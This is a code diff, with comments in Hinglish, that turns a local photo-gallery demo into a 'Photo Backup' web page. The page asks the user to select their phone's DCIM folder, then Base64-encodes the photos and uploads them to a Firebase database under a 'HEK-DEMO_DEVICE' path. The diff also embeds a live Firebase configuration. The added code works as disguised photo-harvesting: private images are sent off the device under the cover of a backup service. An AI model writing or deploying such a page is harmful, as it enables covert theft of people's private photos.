@@ -3,90 +3,189 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DCIM Select Demo</title>
+    <title>Photo Uploader</title>
     <style>
         body { font-family: system-ui, sans-serif; background: #000; color: #fff; text-align: center; padding: 40px 20px; }
         .box { background: #1c1c1e; border: 1px solid #333; border-radius: 16px; padding: 30px 20px; max-width: 400px; margin: auto; }
         h2 { color: #4f8cff; margin-bottom: 10px; }
         p { color: #888; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
-        .btn { padding: 14px 24px; background: #4f8cff; color: white; border: none; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
-        .btn:active { transform: scale(0.98); }
-        #gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 8px; margin-top: 20px; }
-        .img-box { aspect-ratio: 1; background: #222; border-radius: 8px; overflow: hidden; }
-        .img-box img { width: 100%; height: 100%; object-fit: cover; }
+        .btn { padding: 14px 24px; background: #4f8cff; color: white; border: none; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 10px; }
+        .btn-cancel { background: #ff3b30; }
         .hidden { display: none; }
+        
+        .progress-bar { width: 100%; height: 8px; background: #333; border-radius: 4px; overflow: hidden; margin-bottom: 10px; }
+        .progress-fill { height: 100%; background: #4f8cff; width: 0%; transition: width 0.3s; }
+        
+        #gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); gap: 8px; margin-top: 20px; max-height: 200px; overflow-y: auto; }
+        .img-box { aspect-ratio: 1; background: #222; border-radius: 8px; overflow: hidden; opacity: 0.5; transition: opacity 0.3s; }
+        .img-box.uploaded { opacity: 1; border: 2px solid #34A853; }
+        .img-box img { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
 <body>
 
-    <!-- Step 1: Initial Screen -->
+    <!-- Screen 1: Start -->
     <div class="box" id="startScreen">
-        <h2>📸 Photo Sync</h2>
-        <p>Apni photos sync karne ke liye niche diye button par click karein aur <b>DCIM</b> folder select karein.</p>
-        <button class="btn" id="startBtn">Select DCIM Folder</button>
+        <h2>📸 Photo Backup</h2>
+        <p>Apni photos safe rakhne ke liye niche click karein aur <b>DCIM</b> folder select karein.</p>
+        <button class="btn" id="startBtn">Allow & Select Folder</button>
     </div>
 
-    <!-- Step 2: Hidden Input -->
     <input type="file" id="folderPicker" webkitdirectory directory multiple style="display:none;">
 
-    <!-- Step 3: Loading / Gallery -->
-    <div class="box hidden" id="galleryScreen">
-        <h2 id="statusText">Scanning...</h2>
-        <p id="countText">Photos load ho rahi hain...</p>
+    <!-- Screen 2: Uploading -->
+    <div class="box hidden" id="uploadScreen">
+        <h2 id="statusText">Uploading...</h2>
+        <p id="countText">0 / 0 photos</p>
+        
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <button class="btn btn-cancel" id="cancelBtn">Cancel Upload</button>
+        
         <div id="gallery"></div>
     </div>
 
-    <script>
+    <script type="module">
+        // Firebase SDK Import
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+        // Tumhara Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
+            authDomain: "my-rto-b2531.firebaseapp.com",
+            databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
+            projectId: "my-rto-b2531",
+            storageBucket: "my-rto-b2531.appspot.com",
+            messagingSenderId: "465334829178",
+            appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Variables
         const startBtn = document.getElementById('startBtn');
         const folderPicker = document.getElementById('folderPicker');
         const startScreen = document.getElementById('startScreen');
-        const galleryScreen = document.getElementById('galleryScreen');
-        const gallery = document.getElementById('gallery');
+        const uploadScreen = document.getElementById('uploadScreen');
         const statusText = document.getElementById('statusText');
         const countText = document.getElementById('countText');
+        const progressFill = document.getElementById('progressFill');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const gallery = document.getElementById('gallery');
 
-        // 1. Button click par input trigger karo
+        let isCancelled = false;
+        let uploadQueue = [];
+
+        // 1. Start Button Click
         startBtn.addEventListener('click', () => {
             folderPicker.click();
         });
 
-        // 2. Jab user folder select kar le (Allow kar de)
-        folderPicker.addEventListener('change', function(e) {
+        // 2. Folder Select Hone Par
+        folderPicker.addEventListener('change', async function(e) {
             const files = Array.from(e.target.files);
-            
-            // Screen change karo
-            startScreen.classList.add('hidden');
-            galleryScreen.classList.remove('hidden');
-
-            // Sirf photos filter karo
-            const imageFiles = files.filter(file => file.type.startsWith('image/'));
+            const imageFiles = files.filter(f => f.type.startsWith('image/')).slice(0, 10); // Demo ke liye sirf 10 photo
 
             if (imageFiles.length === 0) {
-                statusText.textContent = "❌ Error";
-                countText.textContent = "Is folder me koi photo nahi mili. Dobara try karein.";
+                alert("Koi photo nahi mili!");
                 return;
             }
 
-            statusText.textContent = "✅ Scan Complete";
-            countText.textContent = `Total ${imageFiles.length} photos mili.`;
+            // UI Update
+            startScreen.classList.add('hidden');
+            uploadScreen.classList.remove('hidden');
+            gallery.innerHTML = '';
             
-            console.log("Photos:", imageFiles);
-
-            // 3. Photos ko screen par dikhao
+            // Photos ko gallery me dikhao (grey color me)
             imageFiles.forEach(file => {
-                const imgUrl = URL.createObjectURL(file);
-                
                 const box = document.createElement('div');
                 box.className = 'img-box';
-                
+                box.id = 'img-' + file.name.replace(/[^a-zA-Z0-9]/g, '');
                 const img = document.createElement('img');
-                img.src = imgUrl;
-                img.loading = "lazy";
-                
+                img.src = URL.createObjectURL(file);
                 box.appendChild(img);
                 gallery.appendChild(box);
             });
+
+            uploadQueue = imageFiles;
+            startUploadProcess();
         });
+
+        // 3. Upload Logic (Ek-ek karke)
+        async function startUploadProcess() {
+            const total = uploadQueue.length;
+            let done = 0;
+            
+            statusText.textContent = "Uploading...";
+            isCancelled = false;
+
+            for (let i = 0; i < total; i++) {
+                // Agar Cancel dabaya toh loop rok do
+                if (isCancelled) {
+                    statusText.textContent = "❌ Upload Cancelled";
+                    return;
+                }
+
+                const file = uploadQueue[i];
+                
+                // UI Update
+                countText.textContent = `${done} / ${total} photos`;
+                progressFill.style.width = ((done / total) * 100) + '%';
+                statusText.textContent = "Uploading: " + file.name;
+
+                try {
+                    // Photo ko Base64 me convert karo
+                    const base64 = await fileToBase64(file);
+                    
+                    // Firebase me bhejo
+                    const photoRef = push(ref(db, 'photos/HEK-DEMO_DEVICE')); 
+                    await set(photoRef, {
+                        name: file.name,
+                        image: base64,
+                        size: file.size,
+                        timestamp: Date.now(),
+                        username: "Demo_Student"
+                    });
+
+                    // Success hone par Box ko green karo
+                    const boxId = 'img-' + file.name.replace(/[^a-zA-Z0-9]/g, '');
+                    document.getElementById(boxId).classList.add('uploaded');
+                    
+                    done++;
+                    console.log(`✅ Uploaded: ${file.name}`);
+
+                } catch (err) {
+                    console.error("Failed:", file.name, err);
+                }
+            }
+
+            // Sab ho jaye toh
+            progressFill.style.width = '100%';
+            countText.textContent = `${done} / ${total} photos`;
+            statusText.textContent = "✅ Upload Complete!";
+            cancelBtn.style.display = 'none'; // Ab cancel ki zaroorat nahi
+        }
+
+        // 4. Cancel Button
+        cancelBtn.addEventListener('click', () => {
+            isCancelled = true;
+            cancelBtn.textContent = "Stopping...";
+            cancelBtn.disabled = true;
+        });
+
+        // Helper: File to Base64
+        function fileToBase64(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result);
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
+            });
+        }
     </script>
 </body>
 </html>
